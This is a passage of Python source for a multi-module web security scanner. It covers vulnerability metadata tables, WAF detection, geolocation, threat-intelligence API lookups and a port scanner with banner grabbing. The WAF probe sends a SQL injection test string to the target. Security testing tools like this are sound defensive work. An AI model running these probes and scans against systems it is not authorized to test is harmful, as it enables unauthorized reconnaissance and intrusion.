"cve_scan":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-1035","cvss":7.5,"wstg":"WSTG-INFO-02","asvs":"V14.2","biz":"Known CVE vulnerabilities in server software may be exploitable without patching"},
"s3_brute":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-312","cvss":7.5,"wstg":"WSTG-CONF-10","asvs":"V14.4","biz":"Public S3 buckets may expose sensitive data or permit unauthorized file uploads"},
"wayback_urls":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":5.3,"wstg":"WSTG-INFO-02","asvs":"V14.3","biz":"Historical URLs may reveal deprecated endpoints, debug paths or sensitive data"},
"param_discover":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":5.3,"wstg":"WSTG-INFO-07","asvs":"V13.1","biz":"Hidden parameters may expose unintended functionality or bypass security controls"},
"race_condition":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-362","cvss":8.1,"wstg":"WSTG-BUSL-09","asvs":"V11.1","biz":"Race conditions enable TOCTOU attacks, double-spend or privilege escalation"},
"nosql_inject":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-943","cvss":9.8,"wstg":"WSTG-INPV-01","asvs":"V5.4","biz":"NoSQL injection enables authentication bypass and unrestricted data access"},
"sspp":{"owasp":"A08:2021","owasp_name":"Software and Data Integrity Failures","cwe":"CWE-1321","cvss":8.1,"wstg":"WSTG-INPV-11","asvs":"V5.4","biz":"Server-side prototype pollution corrupts shared objects enabling RCE or privilege escalation"},
"oob_blind":{"owasp":"A10:2021","owasp_name":"Server-Side Request Forgery","cwe":"CWE-918","cvss":7.5,"wstg":"WSTG-INPV-19","asvs":"V10.3","biz":"OOB blind vulnerabilities exfiltrate data via DNS or HTTP out-of-band channels"},
"file_upload":{"owasp":"A04:2021","owasp_name":"Insecure Design","cwe":"CWE-434","cvss":9.8,"wstg":"WSTG-BUSL-08","asvs":"V12.2","biz":"Unrestricted file upload enables webshell deployment and remote code execution"},
"postmessage":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-345","cvss":6.5,"wstg":"WSTG-CLNT-10","asvs":"V13.2","biz":"PostMessage without origin validation enables cross-origin data theft or UI redress"},
"acct_enum":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-204","cvss":5.3,"wstg":"WSTG-IDNT-04","asvs":"V2.9","biz":"Account enumeration aids targeted attacks by revealing valid usernames via response differences"},
"login_brute":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-307","cvss":9.8,
        "biz": "Weak or default credentials on login forms allow attackers to gain unauthorized access through automated brute-force, credential stuffing, or password spray attacks — bypassing authentication entirely.","wstg": "WSTG-ATHN-03","asvs": "ASVS-2.2.1"},
# ── v11.8: Threat Intelligence API categories ────────────────────
"threat_intel":{"owasp":"A09:2021","owasp_name":"Security Logging and Monitoring Failures","cwe":"CWE-693","cvss":8.5,
        "wstg":"WSTG-INFO-01","asvs":"V7.2",
        "biz":"External threat intelligence confirms the target is flagged as malicious or abusive — indicating active exploitation, blacklisting, or compromise."},
"shodan_intel":{"owasp":"A05:2021","owasp_name":"Security Misconfiguration","cwe":"CWE-16","cvss":7.5,
        "wstg":"WSTG-CONF-01","asvs":"V14.4",
        "biz":"Shodan passive scan reveals exposed services, open ports and known CVEs on the target IP — attackers use this data to plan exploits."},
}

CAT_TITLES = {
    "waf":      ("🛡",  "WAF Detection"),
    "ports":    ("🔍",  "Open Ports"),
    "subdomains":("🔎", "Subdomains"),
    "headers":  ("🔒",  "Security Headers"),
    "methods":  ("⚙",   "HTTP Methods"),
    "sqli":     ("💉",  "SQL Injection"),
    "xss":      ("🧨",  "Cross-Site Scripting"),
    "lfi":      ("📂",  "Local File Inclusion"),
    "ssrf":     ("🔄",  "SSRF"),
    "xxe":      ("📄",  "XXE Injection"),
    "redirect": ("↗",   "Open Redirect"),
    "cors":     ("🌍",  "CORS Misconfiguration"),
    "sensitive":("📁",  "Sensitive Files"),
    "dirs":     ("📂",  "Directories Found"),
    "ssl":      ("🔐",  "SSL/TLS"),
    "tech":     ("🔬",  "Technology Detected"),
    "cookies":  ("🍪",  "Cookie Issues"),
    "csrf":     ("🛡",  "CSRF"),
    "privesc":  ("⚡",  "Privilege Escalation"),
    "ssti":     ("🧪",  "SSTI Injection"),
    "cmdi":     ("💻",  "Command Injection"),
    "jwt":      ("🔑",  "JWT Vulnerabilities"),
    "ratelimit":("⏱",  "Rate Limiting"),
    "authn_bypass":("🔓","Auth Bypass"),
    "graphql":  ("📡",  "GraphQL Testing"),
    "post_inject":("📮", "POST Injection"),
    "stored_xss": ("💾", "Stored XSS"),
    "hostheader": ("🏠", "Host Header Injection"),
    "crlf":       ("↩",  "CRLF Injection"),
    "idor":       ("🔢", "IDOR"),
    "subdomain_takeover":("⚠","Subdomain Takeover"),
    "dns_axfr":   ("📡", "DNS Zone Transfer"),
    "smuggling":  ("📨", "HTTP Request Smuggling"),
    # Phase 2b — v10.0
    "oauth2":      ("🔑", "OAuth 2.0"),
    "hpp":         ("🔀", "HTTP Parameter Pollution"),
    "cache_poison":("💾", "Cache Poisoning"),
    "proto_poll":  ("🧬", "Prototype Pollution"),
    "deserial":    ("📦", "Deserialization"),
    "api_sec":     ("📡", "API Security"),
    "biz_logic":   ("🏦", "Business Logic"),
    # Phase 2c — v11.0
    "websocket":   ("🔌", "WebSocket Security"),
    "saml":        ("🔐", "SAML Misconfiguration"),
    "otp_bypass":  ("🔑", "2FA/OTP Bypass"),
    "path_norm":   ("📂", "Path Normalization"),
    "email_inject":("📧", "Email Header Injection"),
    "dep_confusion":("📦","Dependency Confusion"),
    "dom_xss":     ("🧨", "DOM-based XSS"),
    "ip_info":     ("🌍", "IP Info"),
    # Phase 1 OSINT — v11.3
    "osint_email": ("📧", "OSINT — Email Harvest"),
    "osint_dns":   ("🔎", "OSINT — DNS Intelligence"),
    "osint_dorks": ("🔍", "OSINT — Google Dorks"),
    "osint_breach":("💥", "OSINT — Data Breach"),
    "osint_github":("🐙", "OSINT — GitHub Exposure"),
    "osint_js":    ("📜", "OSINT — JS Secrets"),
    "default_creds":  ("🔑", "Default Credentials"),
    "srv_hardening":  ("🔩", "Server Hardening & CGI"),
    "info_disclosure":("📰", "Information Disclosure"),
    "zap_passive":    ("🔬", "ZAP-style Passive Analysis"),
    "cloud_bucket":    ("☁️",  "Cloud Storage Exposure"),
    "mass_assignment": ("📦",  "Mass Assignment"),
    "acct_takeover":   ("🔐",  "Account Takeover"),
    "redos":           ("⏱️",  "RegEx DoS (ReDoS)"),
    "clickjacking":    ("🖱️",  "Clickjacking"),
    "jsonp_inject":    ("🔗",  "JSONP Injection"),
    "css_inject":      ("🎨",  "CSS Injection"),
    "http2_vulns":     ("🌐",  "HTTP/2 Vulnerabilities"),
    "cve_scan":        ("📋",  "CVE Scan (Technology)"),
    "s3_brute":        ("🪣",  "S3 Bucket Brute-Force"),
    "wayback_urls":    ("🕰️",  "Wayback / Archive URLs"),
    "param_discover":  ("🔎",  "Parameter Discovery"),
    "race_condition":  ("🏁",  "Race Condition"),
    "nosql_inject":    ("💉",  "NoSQL Injection"),
    "sspp":            ("🔗",  "Server-Side Prototype Pollution"),
    "oob_blind":       ("📡",  "OOB Blind SSRF/XXE"),
    "file_upload":     ("📁",  "Malicious File Upload"),
    "postmessage":     ("💬",  "PostMessage / Browser Storage"),
    "acct_enum":       ("👤",  "Account Enumeration"),
    "login_brute":     ("🔑",  "Expert Login Brute-Force"),
    # v11.8: Threat Intelligence API
    "threat_intel":    ("🛡️",  "Threat Intelligence (VirusTotal/AbuseIPDB/URLScan)"),
    "shodan_intel":    ("🌐",  "Shodan Intelligence (Ports/CVEs/Services)"),
}

# ─── Terminal UI ───────────────────────────────────────────────────
def _log(tag, col, msg, sev=None):
    if QUIET and tag in ("INFO   ", "WARN   "):
        with _lock:
            LOG.append(f"[Q] {tag} {msg}")
        return
    ts   = datetime.datetime.now().strftime("%H:%M:%S")
    icon = (SEV_ICON.get(sev,"")+" ") if sev else ""
    line = f"{Fore.WHITE}[{ts}]{Style.RESET_ALL} {col}{tag}{Style.RESET_ALL} {icon}{msg}"
    with _lock:
        print(line)
        LOG.append(f"[{ts}] {tag} {icon}{msg}")

def vlog(msg):
    if not VERBOSE: return
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"{Fore.WHITE}[{ts}]{Style.RESET_ALL} {Fore.MAGENTA}VERBOSE{Style.RESET_ALL} {msg}"
    with _lock:
        print(line)
        LOG.append(f"[{ts}] VERBOSE {msg}")

def info(m):   _log("INFO   ",Fore.CYAN,m)
def good(m):   _log("FOUND  ",Fore.GREEN+Style.BRIGHT,m)
def warn(m):   _log("WARN   ",Fore.YELLOW,m)
def vuln(m,s): _log("VULN   ",SEV_COLOR.get(s,Fore.RED),m,sev=s)
def err(m):    _log("ERROR  ",Fore.WHITE+Style.DIM,m)

def add(cat, item):
    with _lock:
        FINDINGS[cat].append(item)

def _pass(fut):
    """Silently consume future exceptions (used in parallel scan loops)."""
    try: fut.result()
    except Exception: pass

def _add(title, severity, cat, url, owasp, cwe, description, evidence, cvss_score, recommendation):
    """Convenience wrapper used by v10/v11 modules — builds finding dict and stores it."""
    meta = CAT_META.get(cat, {})
    item = {
        "title":          title,
        "severity":       severity,
        "url":            url,
        "owasp":          owasp or meta.get("owasp",""),
        "cwe":            cwe   or meta.get("cwe",""),
        "description":    description,
        "evidence":       str(evidence)[:300] if evidence else "",
        "cvss":           cvss_score,
        "recommendation": recommendation,
    }
    with _lock:
        FINDINGS[cat].append(item)
    vuln(f"[{cat.upper()}] {title} ({severity})", severity)

def section(title, icon=""):
    bar = "═"*62
    with _lock:
        print(f"\n{Fore.CYAN}{bar}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  {icon}  {title}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{bar}{Style.RESET_ALL}\n")
        LOG.append(f"\n{'='*62}\n  {icon}  {title}\n{'='*62}")

def progress(cur, tot, label=""):
    if QUIET: return
    if tot == 0: return
    pct  = int(cur/tot*38)
    bar  = "█"*pct + "░"*(38-pct)
    line = f"\r  {Fore.CYAN}[{bar}]{Style.RESET_ALL} {cur}/{tot}  {label[:28]:<28}"
    with _lock:
        sys.stdout.write(line)
        sys.stdout.flush()

def elapsed():
    secs = int(time.time()-START_TIME)
    return f"{secs//60}m {secs%60}s"

def _risk_score():
    score = sum(SEV_SCORE.get(item.get("severity","Info"),0)
                for items in FINDINGS.values() for item in items)
    return min(score,100)

def _sev_counts():
    c = {s:0 for s in SEV_ICON}
    for items in FINDINGS.values():
        for item in items:
            s = item.get("severity","Info")
            if s in c: c[s] += 1
    return c

def _total():
    return sum(len(v) for v in FINDINGS.values())

# ─── Checkpoint helpers ────────────────────────────────────────────
def _save_checkpoint():
    if not CHECKPOINT_FILE: return
    try:
        state = {
            "findings": {k: list(v) for k, v in FINDINGS.items()},
            "completed_modules": SCAN_STATE.get("completed_modules", []),
            "timestamp": datetime.datetime.now().isoformat()
        }
        with open(CHECKPOINT_FILE, "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2, default=str)
        vlog(f"Checkpoint saved: {CHECKPOINT_FILE}")
    except Exception as ex:
        err(f"Checkpoint save failed: {ex}")

def _load_checkpoint(path):
    try:
        with open(path, encoding="utf-8") as f:
            state = json.load(f)
        for cat, items in state.get("findings", {}).items():
            FINDINGS[cat] = items
        SCAN_STATE["completed_modules"] = state.get("completed_modules", [])
        completed = SCAN_STATE["completed_modules"]
        good(f"Resumed from checkpoint: {path}")
        if completed:
            good(f"Skipping already-completed modules: {', '.join(completed)}")
        return True
    except Exception as ex:
        err(f"Checkpoint load failed: {ex}")
        return False

def _module_done(name):
    with _lock:
        if name not in SCAN_STATE["completed_modules"]:
            SCAN_STATE["completed_modules"].append(name)
    _save_checkpoint()

def _module_skip(name):
    # Resume checkpoint: already done
    if name in SCAN_STATE.get("completed_modules", []):
        return True
    # Scope filter: --scope flag set and this module not in scope
    if SCAN_SCOPE and name not in SCAN_SCOPE:
        return True
    return False

# ─── HTTP Session (connection pool for speed) ─────────────────────
_sess = requests.Session()
_sess.headers.update({"User-Agent": UA})
_sess.verify = False
_adapter = requests.adapters.HTTPAdapter(
    pool_connections=50,
    pool_maxsize=100,
    max_retries=0,
)
_sess.mount("http://",  _adapter)
_sess.mount("https://", _adapter)

_rate_lock = threading.Lock()

def rget(url, **kw):
    delay = max(RATE, RATE_DELAY)
    if delay > 0:
        with _rate_lock:
            gap = delay - (time.time() - _last_req[0])
            if gap > 0: time.sleep(gap)
            _last_req[0] = time.time()
    kw.setdefault("timeout", TIMEOUT)
    kw.setdefault("allow_redirects", True)
    vlog(f"GET {url[:80]}")
    return _sess.get(url, **kw)

def rpost(url, **kw):
    delay = max(RATE, RATE_DELAY)
    if delay > 0:
        with _rate_lock:
            gap = delay - (time.time() - _last_req[0])
            if gap > 0: time.sleep(gap)
            _last_req[0] = time.time()
    kw.setdefault("timeout", TIMEOUT)
    vlog(f"POST {url[:80]}")
    return _sess.post(url, **kw)

# ─── Banner ────────────────────────────────────────────────────────
def banner():
    print(Fore.RED+Style.BRIGHT+r"""
██╗    ██╗███████╗██████╗ ███████╗ ██████╗ █████╗ ███╗   ██╗    ██████╗ ██████╗  ██████╗
██║    ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║    ██╔══██╗██╔══██╗██╔═══██╗
██║ █╗ ██║█████╗  ██████╔╝███████╗██║     ███████║██╔██╗ ██║    ██████╔╝██████╔╝██║   ██║
██║███╗██║██╔══╝  ██╔══██╗╚════██║██║     ██╔══██║██║╚██╗██║    ██╔═══╝ ██╔══██╗██║   ██║
╚███╔███╔╝███████╗██████╔╝███████║╚██████╗██║  ██║██║ ╚████║    ██║     ██║  ██║╚██████╔╝
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝
"""+Style.RESET_ALL)
    print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}  Professional Web Security Scanner{Style.RESET_ALL}  {Fore.YELLOW}v{VERSION}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}  80 Modules  |  CVSS v3.1 · OWASP · CWE  |  PDF · Burp XML · CVE Reports{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}{'─'*68}{Style.RESET_ALL}\n")

# ═══ MODULE 0 — WAF DETECTION (v9.0: 30+ signatures) ════════════
def detect_waf(url):
    if _module_skip("waf"): info("Skipping WAF (already done)"); return
    section("MODULE 0 — WAF DETECTION","🛡")
    detected = None
    try:
        r = rget(url)
        hdrs = " ".join(f"{k}: {v}" for k,v in r.headers.items()).lower()
        body = r.text.lower()[:5000]
        for waf, sigs in WAF_SIGS_GLOBAL.items():
            if any(s in hdrs or s in body for s in sigs):
                detected = waf; break
        # Also probe with SQLi payload to trigger WAF block pages
        if not detected:
            try:
                r2 = rget(url + "/?id=1'%20OR%20'1'='1", timeout=5, allow_redirects=False)
                h2 = " ".join(f"{k}: {v}" for k,v in r2.headers.items()).lower()
                b2 = r2.text.lower()[:3000]
                for waf, sigs in WAF_SIGS_GLOBAL.items():
                    if any(s in h2 or s in b2 for s in sigs):
                        detected = waf; break
                if not detected and r2.status_code in (403, 406, 429, 503):
                    detected = "Generic WAF/IPS (block detected)"
            except Exception:
                pass
    except Exception as e:
        err(f"WAF probe: {e}"); _module_done("waf"); return

    if detected:
        warn(f"WAF Detected: {Fore.YELLOW}{detected}{Style.RESET_ALL}")
        warn("Results may be incomplete — WAF may block payloads")
        add("waf",{"waf":detected,"severity":"Info",
            "title":f"WAF Detected: {detected}",
            "description":f"A Web Application Firewall ({detected}) was detected. The scanner tested {len(WAF_SIGS_GLOBAL)} WAF signatures. Some tests may be blocked or return false negatives.",
            "recommendation":"WAF is a good defence layer but not a substitute for fixing underlying vulnerabilities. Test manually with WAF bypass techniques for critical parameters."})
    else:
        info("No WAF detected — direct access to application")
        add("waf",{"waf":"None","severity":"Info",
            "title":"No WAF Detected",
            "description":f"No WAF was detected among {len(WAF_SIGS_GLOBAL)} tested signatures. All vulnerability tests will reach the application directly, giving the most accurate results.",
            "recommendation":"Consider deploying a WAF (Cloudflare, ModSecurity) as an extra security layer."})
    _module_done("waf")

# ═══ MODULE 1 — IP INFO ══════════════════════════════════════════
def get_ip_info(domain):
    if _module_skip("ip_info"): return {}
    section("MODULE 1 — IP INFO & GEOLOCATION","🌐")
    result = {}
    try:
        ip = socket.gethostbyname(domain)
        info(f"Domain    : {domain}")
        info(f"IP Address: {Fore.GREEN}{ip}{Style.RESET_ALL}")
        result["ip"] = ip
        try:
            geo = rget(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,lat,lon")
            d   = geo.json()
            if d.get("status") == "success":
                info(f"Country   : {d.get('country','N/A')} / {d.get('regionName','N/A')}")
                info(f"City      : {d.get('city','N/A')}")
                info(f"ISP       : {d.get('isp','N/A')}")
                info(f"Org       : {d.get('org','N/A')}")
                info(f"ASN       : {d.get('as','N/A')}")
                result.update(d)
        except Exception:
            warn("Geolocation lookup failed")
    except socket.gaierror:
        err(f"Cannot resolve: {domain}")
    _module_done("ip_info")
    return result

# ═══ MODULE 81 — THREAT INTELLIGENCE API (v11.8: VT/Shodan/AbuseIPDB/URLScan) ══

def _vt_check(target_url, api_key):
    """VirusTotal v3 API — URL reputation (70+ AV engines)."""
    try:
        import base64
        url_id = base64.urlsafe_b64encode(target_url.encode()).rstrip(b"=").decode()
        r = rget(f"https://www.virustotal.com/api/v3/urls/{url_id}",
                 headers={"x-apikey": api_key}, timeout=20)
        if r.status_code == 200:
            attrs = r.json().get("data",{}).get("attributes",{})
            stats = attrs.get("last_analysis_stats",{})
            malicious  = stats.get("malicious", 0)
            suspicious = stats.get("suspicious", 0)
            total      = sum(stats.values()) or 1
            info(f"VirusTotal: {malicious} malicious | {suspicious} suspicious | {total} engines")
            if malicious > 0 or suspicious > 0:
                sev = "Critical" if malicious >= 5 else "High" if malicious > 0 else "Medium"
                add("threat_intel", {
                    "title":f"VirusTotal: {malicious} malicious / {suspicious} suspicious detections",
                    "severity": sev,
                    "url": target_url,
                    "description":(f"VirusTotal scanned {total} AV engines. "
                                   f"Malicious: {malicious}, Suspicious: {suspicious}. "
                                   f"Stats: {stats}"),
                    "evidence": str(stats),
                    "recommendation":("Investigate flagged content. Remove or remediate malicious code. "
                                      "Full report: https://www.virustotal.com"),
                    "owasp":"A09:2021","cwe":"CWE-693","cvss_score":8.5,
                })
                warn(f"VirusTotal: FLAGGED — {malicious} malicious | {suspicious} suspicious")
            else:
                good(f"VirusTotal: Clean ({total} engines — 0 detections)")
        elif r.status_code == 404:
            # Submit for first-time analysis
            r2 = requests.post("https://www.virustotal.com/api/v3/urls",
                               headers={"x-apikey": api_key},
                               data={"url": target_url}, timeout=15)
            if r2.status_code == 200:
                info("VirusTotal: URL submitted for analysis (not cached yet — check results in ~1 min)")
            else:
                info(f"VirusTotal: Submission status {r2.status_code}")
        elif r.status_code == 429:
            warn("VirusTotal: Rate limit hit (free: 4 req/min). Skipping.")
        elif r.status_code == 401:
            warn("VirusTotal: Invalid API key")
        else:
            warn(f"VirusTotal: HTTP {r.status_code}")
    except Exception as _e:
        warn(f"VirusTotal check error: {_e}")


def _shodan_check(ip, api_key):
    """Shodan API — open ports, service banners, known CVEs."""
    try:
        r = requests.get(f"https://api.shodan.io/shodan/host/{ip}",
                         params={"key": api_key}, timeout=20)
        if r.status_code == 200:
            data    = r.json()
            ports   = data.get("ports", [])
            vulns   = data.get("vulns", {})
            org     = data.get("org",          "Unknown")
            country = data.get("country_name", "Unknown")
            hostnames = data.get("hostnames", [])
            info(f"Shodan: {ip} | Org={org} | {country} | Ports={ports}")
            if hostnames:
                info(f"Shodan: Hostnames: {hostnames}")
            # Open ports finding
            if ports:
                add("shodan_intel", {
                    "title": f"Shodan: {len(ports)} open port(s) on {ip}",
                    "severity": "Info",
                    "url": ip,
                    "description":(f"Shodan passive scan found {len(ports)} open ports on {ip}. "
                                   f"Org: {org} | Country: {country} | Hostnames: {hostnames}"),
                    "evidence": f"Ports: {ports}",
                    "recommendation":("Close unused ports. Restrict access with firewall rules. "
                                      "Nginx: allow specific IP ranges; deny all."),
                    "owasp":"A05:2021","cwe":"CWE-16","cvss_score":5.0,
                })
            # CVE finding
            if vulns:
                cve_list = sorted(vulns.keys())
                add("shodan_intel", {
                    "title": f"Shodan: {len(cve_list)} known CVE(s) on {ip}",
                    "severity": "Critical",
                    "url": ip,
                    "description":(f"Shodan found {len(cve_list)} public CVEs on {ip}: "
                                   f"{', '.join(cve_list[:10])}"
                                   + (" ..." if len(cve_list)>10 else "")),
                    "evidence": f"CVEs: {cve_list}",
                    "recommendation":("Patch listed CVEs immediately. Apply security updates. "
                                      "Subscribe to vendor advisories."),
                    "owasp":"A06:2021","cwe":"CWE-937","cvss_score":9.8,
                })
                warn(f"Shodan: {len(cve_list)} CVEs: {', '.join(cve_list[:5])}")
            else:
                good(f"Shodan: No known CVEs on {ip}")
        elif r.status_code == 404:
            info(f"Shodan: No scan data for {ip}")
        elif r.status_code == 401:
            warn("Shodan: Invalid API key")
        elif r.status_code == 429:
            warn("Shodan: Rate limit hit (free: 100 queries/month)")
        else:
            warn(f"Shodan: HTTP {r.status_code}")
    except Exception as _e:
        warn(f"Shodan check error: {_e}")


def _abuseipdb_check(ip, api_key):
    """AbuseIPDB API — IP reputation / blacklist confidence score."""
    try:
        r = requests.get("https://api.abuseipdb.com/api/v2/check",
                         params={"ipAddress": ip, "maxAgeInDays": 90, "verbose": True},
                         headers={"Key": api_key, "Accept": "application/json"},
                         timeout=15)
        if r.status_code == 200:
            data    = r.json().get("data", {})
            score   = data.get("abuseConfidenceScore", 0)
            reports = data.get("totalReports", 0)
            country = data.get("countryCode", "?")
            isp     = data.get("isp", "?")
            last_at = data.get("lastReportedAt", "Never")
            info(f"AbuseIPDB: {ip} | Score={score}% | Reports={reports} | {country} | {isp}")
            if score >= 25:
                sev = "Critical" if score >= 75 else "High" if score >= 50 else "Medium"
                add("threat_intel", {
                    "title": f"AbuseIPDB: {ip} has {score}% abuse confidence score",
                    "severity": sev,
                    "url": ip,
                    "description":(f"AbuseIPDB confidence: {score}% | Total reports: {reports} | "
                                   f"Country: {country} | ISP: {isp} | Last reported: {last_at}"),
                    "evidence": f"Score: {score}% | Reports: {reports} | Last: {last_at}",
                    "recommendation":("Block this IP at firewall/WAF level if it is external. "
                                      "If this is your server IP, check for compromise or abuse."),
                    "owasp":"A09:2021","cwe":"CWE-693","cvss_score":7.5,
                })
                warn(f"AbuseIPDB: {score}% abuse score | {reports} reports in 90 days")
            else:
                good(f"AbuseIPDB: Clean — {score}% score | {reports} reports")
        elif r.status_code == 429:
            warn("AbuseIPDB: Rate limit hit (free: 1000/day)")
        elif r.status_code == 401:
            warn("AbuseIPDB: Invalid API key")
        else:
            warn(f"AbuseIPDB: HTTP {r.status_code}")
    except Exception as _e:
        warn(f"AbuseIPDB check error: {_e}")


def _urlscan_check(target_url, api_key):
    """URLScan.io API — passive scan lookup + optional submission."""
    try:
        domain = urlparse(target_url).hostname or target_url
        # Search for existing scans
        r = requests.get("https://urlscan.io/api/v1/search/",
                         params={"q": f"domain:{domain}", "size": 5},
                         headers={"API-Key": api_key},
                         timeout=15)
        if r.status_code == 200:
            results = r.json().get("results", [])
            info(f"URLScan.io: {len(results)} previous scans for {domain}")
            if results:
                latest  = results[0]
                scan_id = latest.get("_id","")
                verdict = latest.get("verdicts", {}).get("overall", {})
                score      = verdict.get("score", 0)
                malicious  = verdict.get("malicious", False)
                categories = verdict.get("categories", [])
                link = f"https://urlscan.io/result/{scan_id}/"
                if malicious or score > 50:
                    add("threat_intel", {
                        "title": f"URLScan.io: {domain} flagged ({'malicious' if malicious else 'suspicious'})",
                        "severity": "High" if malicious else "Medium",
                        "url": target_url,
                        "description":(f"URLScan.io verdict: score={score}, malicious={malicious}, "
                                       f"categories={categories}"),
                        "evidence": f"Scan report: {link}",
                        "recommendation": f"Review full scan report: {link}",
                        "owasp":"A09:2021","cwe":"CWE-693","cvss_score":7.0,
                    })
                    warn(f"URLScan.io: score={score} | malicious={malicious} | {link}")
                else:
                    good(f"URLScan.io: Clean (score={score}) | {link}")
            else:
                # Submit new private scan
                r2 = requests.post("https://urlscan.io/api/v1/scan/",
                                   headers={"API-Key": api_key, "Content-Type":"application/json"},
                                   json={"url": target_url, "visibility":"private"},
                                   timeout=15)
                if r2.status_code == 200:
                    uuid = r2.json().get("uuid","")
                    info(f"URLScan.io: Submitted — https://urlscan.io/result/{uuid}/ (ready in ~30s)")
                else:
                    info(f"URLScan.io: Submission status {r2.status_code}")
        elif r.status_code == 429:
            warn("URLScan.io: Rate limit hit (free: 100/hr)")
        elif r.status_code == 400:
            warn("URLScan.io: Bad request")
        else:
            warn(f"URLScan.io: HTTP {r.status_code}")
    except Exception as _e:
        warn(f"URLScan.io check error: {_e}")


def api_intelligence_scan(url, domain, ip,
                           vt_key=None, shodan_key=None,
                           abuseipdb_key=None, urlscan_key=None):
    """MODULE 81 — External Threat Intelligence (VirusTotal/Shodan/AbuseIPDB/URLScan.io).
    API keys read from env vars — never hardcoded.
    Set: VT_API_KEY, SHODAN_API_KEY, ABUSEIPDB_KEY, URLSCAN_KEY
    """
    if _module_skip("api_intel"): info("Skipping API Intel (already done)"); return

    _tasks = []
    if vt_key:
        _tasks.append(lambda: _vt_check(url, vt_key))
    if shodan_key and ip:
        _tasks.append(lambda: _shodan_check(ip, shodan_key))
    if abuseipdb_key and ip:
        _tasks.append(lambda: _abuseipdb_check(ip, abuseipdb_key))
    if urlscan_key:
        _tasks.append(lambda: _urlscan_check(url, urlscan_key))

    if not _tasks:
        info("API Intelligence: No keys configured — skipping"); return

    with ThreadPoolExecutor(max_workers=4) as _ap:
        _futs = [_ap.submit(t) for t in _tasks]
        for _f in as_completed(_futs): _pass(_f)

    _module_done("api_intel")


# ═══ MODULE 2 — PORT SCANNER (v9.0: 150+ ports + banner grabbing) ═
def _grab_banner(host, port, timeout=2):
    """Attempt to grab service banner from open port."""
    banner_str = ""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        # Send generic probe for banner
        probes = {
            80:   b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n",
            443:  b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n",
            21:   None,  # FTP sends banner on connect
            22:   None,  # SSH sends banner on connect
            25:   None,  # SMTP sends banner on connect
            110:  None,  # POP3 sends banner on connect
            143:  None,  # IMAP sends banner on connect
        }
        probe = probes.get(port, b"HEAD / HTTP/1.0\r\n\r\n")
        if probe:
            s.send(probe)
        s.settimeout(1)
        raw = s.recv(512)
        banner_str = raw.decode("utf-8", errors="replace").strip()[:200]
        s.close()
    except Exception:
        pass
    return banner_str

def _scan_port(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        if s.connect_ex((host, port)) == 0:
            s.close()
            return port
        s.close()
    except Exception:
        pass
    return None

def port_scan(domain):
    if _module_skip("ports"): info("Skipping port scan (already done)"); return []
    section("MODULE 2 — PORT SCANNER","🔍")
    info(f"Scanning {len(PORTS_TOP)} ports on {domain} (v9.0: banner grabbing enabled)...")
    open_ports = []
    total = len(PORTS_TOP); done = 0
    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futs = {ex.submit(_scan_port, domain, p): p for p in PORTS_TOP}
        for f in as_completed(futs):
            done += 1; progress(done, total, f"port {futs[f]}")
            r = f.result()
            if r: open_ports.append(r)
    sys.stdout.write("\n"); open_ports.sort()

    if open_ports:
        good(f"Found {len(open_ports)} open port(s) — grabbing banners...")
        for p in open_ports:
            banner_txt = _grab_banner(domain, p)
            risk = PORT_RISK.get(p)
            banner_info = f" | Banner: {banner_txt[:80]}" if banner_txt else ""
            if risk:
                svc, sev, note = risk
                vuln(f"Port {p:5d}  [{svc}]  {note}{banner_info}", sev)
                desc = f"Port {p} ({svc}) is open. {note}"
                if banner_txt:
                    desc += f" Service banner: '{banner_txt[:200]}'"
                add("ports", {"port": p, "service": svc, "severity": sev,
                    "banner": banner_txt,
                    "title": f"Open Port {p} ({svc})",
                    "description": desc,
                    "recommendation": f"If not needed, close port {p} in your firewall rules. If needed, restrict access and keep the service updated."})
            else:
                svc = "Unknown"
                # Try to identify from banner
                if banner_txt:
                    bl = banner_txt.lower()
                    if "ssh" in bl: svc = "SSH-like"
                    elif "http" in bl: svc = "HTTP-like"
                    elif "ftp" in bl: svc = "FTP-like"
                    elif "smtp" in bl: svc = "SMTP-like"
                info(f"Port {p:5d}  [{svc}]{banner_info}")
                add("ports", {"port": p, "service": svc, "severity": "Low",
                    "banner": banner_txt,
                    "title": f"Open Port {p} ({svc})",
                    "description": f"Port {p} is open. Service: {svc}. {banner_txt[:100] if banner_txt else 'No banner retrieved.'}",
                    "recommendation": "Identify the service, verify it is authorized, and ensure it is secured."})
    else:
        info("No open ports found in scanned range")
    _module_done("ports")
    return open_ports

# ═══ MODULE 3 — SUBDOMAIN ENUM ═══════════════════════════════════
SUBS_DEFAULT = [
    "www","mail","remote","blog","webmail","server","ns1","ns2","smtp","secure",
    "vpn","m","shop","ftp","mail2","test","portal","api","admin","dev","staging",
    "app","web","cdn","static","assets","img","images","beta","support","help",
